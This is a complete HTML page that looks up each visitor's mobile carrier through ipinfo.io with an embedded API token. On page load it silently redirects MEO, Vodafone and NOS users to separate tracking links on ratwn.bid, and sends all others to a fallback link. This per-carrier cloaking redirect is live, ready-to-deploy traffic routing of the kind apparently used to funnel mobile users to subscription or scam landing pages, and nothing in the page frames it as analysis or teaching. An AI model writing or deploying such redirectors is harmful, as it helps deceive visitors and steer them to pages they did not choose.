<!DOCTYPE html>
<html>
<head>
  <title>Carrier Redirect</title>
  <script>
  fetch("https://ipinfo.io/json?token=f66e0e91b56461") // replace with your token
  .then(res => res.json())
  .then(data => {
      let carrier = (data.org || "").toLowerCase();

      if(carrier.includes("meo")) {
          window.location.replace("https://ratwn.bid/cl/d1e6f7529047ca50");
      } else if(carrier.includes("vodafone")) {
          window.location.replace("https://ratwn.bid/cl/cf9c6430329e4abf");
      } else if(carrier.includes("nos")) {
          window.location.replace("https://ratwn.bid/cl/661fcd7294264739");
      } else {
          // Fallback: show a manual selection page
          window.location.replace("https://ratwn.bid/cl/fd39f7e65f786cf4");
      }
  })
  .catch(err => {
      window.location.replace("https://ratwn.bid/cl/fd39f7e65f786cf4"); // API failed
  });
  </script>
</head>
<body>
</body>
</html>
